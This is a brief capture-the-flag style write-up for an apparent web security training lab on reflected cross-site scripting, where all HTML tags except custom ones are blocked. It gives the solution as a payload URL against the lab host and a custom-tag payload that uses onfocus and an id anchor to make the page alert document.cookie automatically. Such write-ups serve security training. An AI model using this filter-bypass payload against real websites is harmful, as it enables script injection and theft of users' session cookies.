# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

# Solution:

```payload URL
https://0ad50003034ed0fb80044ebe001000c1.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3Dalert(document.cookie)+id%3Dx+tabindex%3D1%3E#x
```

```script
<custom-tag onfocus=alert(document.cookie) id=x tabindex=1>
```


**NOTE: One should have basic foundations in HTML and it's custom tagsss.**